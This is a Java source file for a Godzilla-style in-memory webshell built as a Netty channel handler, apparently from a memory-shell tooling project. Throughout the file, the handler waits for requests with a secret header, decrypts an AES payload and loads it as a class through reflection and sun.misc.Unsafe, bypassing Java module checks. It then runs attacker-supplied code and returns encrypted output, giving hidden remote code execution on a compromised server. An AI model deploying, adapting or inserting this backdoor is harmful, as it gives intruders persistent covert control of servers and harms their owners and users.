package com.reajason.javaweb.memshell.shelltool.godzilla;

import io.netty.buffer.Unpooled;
import io.netty.channel.ChannelDuplexHandler;
import io.netty.channel.ChannelFutureListener;
import io.netty.channel.ChannelHandler;
import io.netty.channel.ChannelHandlerContext;
import io.netty.handler.codec.http.*;
import io.netty.util.CharsetUtil;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.io.ByteArrayOutputStream;
import java.io.PrintStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;
import java.net.URLDecoder;
import java.nio.charset.StandardCharsets;

/**
 * @author ReaJason
 */
@ChannelHandler.Sharable
public class GodzillaNettyHandler extends ChannelDuplexHandler {
    private static String key;
    private static String pass;
    private static String md5;
    private static String headerName;
    private static String headerValue;
    private final StringBuilder requestBody = new StringBuilder();
    private HttpRequest request;
    private static Class<?> payload;

    @Override
    public void channelRead(ChannelHandlerContext ctx, Object msg) throws Exception {
        if (msg instanceof HttpRequest) {
            request = (HttpRequest) msg;
            HttpHeaders headers = request.headers();
            String value = headers.get(headerName);
            if (value == null || !value.contains(headerValue)) {
                ctx.fireChannelRead(msg);
                return;
            }
            // 如果是当前 payload 进来不能调用 ctx.fireChannelRead(msg)，不然的话下面不能拿到完整的 request body
        }
        if (msg instanceof HttpContent) {
            HttpContent httpContent = (HttpContent) msg;
            HttpHeaders headers = request.headers();
            String value = headers.get(headerName);

            // quick fail，防止其他哥斯拉马打进来走这个逻辑寄了
            if (value == null || !value.contains(headerValue)) {
                ctx.fireChannelRead(msg);
                return;
            }

            String content = httpContent.content().toString(CharsetUtil.UTF_8);
            requestBody.append(content);
            if (httpContent instanceof LastHttpContent) {
                try {
                    String base64Str = URLDecoder.decode(requestBody.substring(pass.length() + 1), "UTF-8");
                    requestBody.setLength(0);
                    byte[] data = x(base64Decode(base64Str), false);
                    if (payload == null) {
                        payload = reflectionDefineClass(data);
                        send(ctx, "");
                    } else {
                        Object f = payload.newInstance();
                        ByteArrayOutputStream arrOut = new ByteArrayOutputStream();
                        f.equals(arrOut);
                        f.equals(data);
                        f.toString();
                        send(ctx, md5.substring(0, 16) + base64Encode(x(arrOut.toByteArray(), true)) + md5.substring(16));
                    }
                } catch (Throwable e) {
                    e.printStackTrace();
                    send(ctx, getErrorMessage(e));
                }
                return;
            }
            ctx.fireChannelRead(msg);
        }
    }

    public Class<?> reflectionDefineClass(byte[] classBytes) throws Exception {
        Object unsafe = null;
        Object rawModule = null;
        long offset = 48;
        Method getAndSetObjectM = null;
        try {
            Class<?> unsafeClass = Class.forName("sun.misc.Unsafe");
            Field unsafeField = unsafeClass.getDeclaredField("theUnsafe");
            unsafeField.setAccessible(true);
            unsafe = unsafeField.get(null);
            rawModule = Class.class.getMethod("getModule").invoke(this.getClass(), (Object[]) null);
            Object module = Class.class.getMethod("getModule").invoke(Object.class, (Object[]) null);
            Method objectFieldOffsetM = unsafe.getClass().getMethod("objectFieldOffset", Field.class);
            offset = (Long) objectFieldOffsetM.invoke(unsafe, Class.class.getDeclaredField("module"));
            getAndSetObjectM = unsafe.getClass().getMethod("getAndSetObject", Object.class, long.class, Object.class);
            getAndSetObjectM.invoke(unsafe, this.getClass(), offset, module);
        } catch (Throwable ignored) {
        }
        URLClassLoader urlClassLoader = new URLClassLoader(new URL[0], Thread.currentThread().getContextClassLoader());
        Method defMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
        defMethod.setAccessible(true);
        Class<?> clazz = (Class<?>) defMethod.invoke(urlClassLoader, classBytes, 0, classBytes.length);
        if (getAndSetObjectM != null) {
            getAndSetObjectM.invoke(unsafe, this.getClass(), offset, rawModule);
        }
        return clazz;
    }

    public byte[] x(byte[] s, boolean m) throws Exception {
        Cipher c = Cipher.getInstance("AES");
        c.init(m ? 1 : 2, new SecretKeySpec(key.getBytes(), "AES"));
        return c.doFinal(s);
    }

    @SuppressWarnings("all")
    public static String base64Encode(byte[] bs) throws Exception {
        try {
            Object encoder = Class.forName("java.util.Base64").getMethod("getEncoder").invoke(null);
            return (String) encoder.getClass().getMethod("encodeToString", byte[].class).invoke(encoder, bs);
        } catch (Exception var6) {
            Object encoder = Class.forName("sun.misc.BASE64Encoder").newInstance();
            return (String) encoder.getClass().getMethod("encode", byte[].class).invoke(encoder, bs);
        }
    }

    @SuppressWarnings("all")
    public static byte[] base64Decode(String bs) throws Exception {
        try {
            Object decoder = Class.forName("java.util.Base64").getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs);
        } catch (Exception var6) {
            Object decoder = Class.forName("sun.misc.BASE64Decoder").newInstance();
            return (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
        }
    }

    private void send(ChannelHandlerContext ctx, String context) throws Exception {
        FullHttpResponse response = new DefaultFullHttpResponse(HttpVersion.HTTP_1_1, HttpResponseStatus.OK, Unpooled.copiedBuffer(context, StandardCharsets.UTF_8));
        response.headers().set("Content-Type", "text/plain; charset=UTF-8");
        response.headers().set(HttpHeaderNames.CONTENT_LENGTH, response.content().readableBytes());
        ctx.channel().writeAndFlush(response).addListener(ChannelFutureListener.CLOSE);
    }

    @SuppressWarnings("all")
    private String getErrorMessage(Throwable throwable) {
        PrintStream printStream = null;
        try {
            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
            printStream = new PrintStream(outputStream);
            throwable.printStackTrace(printStream);
            return outputStream.toString();
        } finally {
            if (printStream != null) {
                printStream.close();
            }
        }
    }
}